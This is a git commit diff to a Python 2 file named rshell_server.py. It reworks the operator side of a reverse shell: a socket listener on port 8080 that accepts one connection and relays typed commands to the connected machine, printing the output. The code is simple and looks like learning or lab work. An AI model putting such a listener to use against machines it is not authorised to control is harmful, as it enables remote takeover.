5e20292b8a12d09238c3afd1e2b8d7c0518625a8
ka1nsha <r4wn3ss@gmail.com>
2016-04-26 04:23:02 +0300

    create server py

--- rshell_server.py
+++ rshell_server.py
@@ -6,33 +6,22 @@ port = 8080
 buff = 2048
 client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
-def req(conn):
-    data = conn.recv(2048)
+binding = host,port
+client_socket.bind(binding)
+client_socket.listen(10)
+def sendcode(c,ac):
+    c.send(ac)
+    data = c.recv(2048)
     if not data:
         pass
     else:
-        print "Çıktı :" + data.decode("utf-8")
-
-def sendcmd(komut,addr):
-    cmd  = raw_input("Code : ")
-    cmd = cmd.encode("utf-8")
-    client_socket.sendto(komut,addr)
-    client_socket.close()
-bcp= host,port
-client_socket.bind(bcp)
-client_socket.listen(10)
-data,addr = client_socket.accept()
-
-start_new_thread(req,(data,))
+        print data
+c,addr = client_socket.accept()
 while True:
-    print "Connection with " + addr[0] + ":" + str(addr[1])
-    komut = raw_input(" > ")
-
-
-
-    if komut == "1":
-        sendcmd(komut,addr)
-
+    
+    ac = raw_input(" > \n")
+    ac.decode("utf-8")
+    sendcode(c,ac)
 
 # if __name__ == '__main__':
 #     t = Thread(target=req(),name="t1")
